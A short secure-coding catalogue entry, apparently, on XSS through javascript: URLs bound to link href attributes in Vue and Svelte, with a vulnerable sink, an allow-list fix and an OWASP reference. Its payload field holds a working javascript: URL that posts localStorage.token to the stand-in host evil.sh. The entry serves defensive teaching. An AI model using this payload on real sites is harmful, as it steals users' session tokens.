---
order: 2
cwe: 79
title: "javascript: URLs in links"
category: injection
severity: high
sink: |-
    <a :href="user.website">
payload: |-
    javascript:fetch('//evil.sh', {
      method: 'POST',
      body: localStorage.token
    })
fix: |
    const url = new URL(input, location.origin);
    if (!["https:", "http:"].includes(url.protocol)) throw new Error("blocked");
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
---

Vue and Svelte bind URLs as-is; only React 19 and Angular neutralise `javascript:`. A profile "website" field bound to `href`, `formaction` or an iframe `src`, or assigned to `location`, runs script on click. Parse with `URL` and allow-list protocols — never block-list the string `javascript:`; tabs, newlines and entity encoding bypass it.
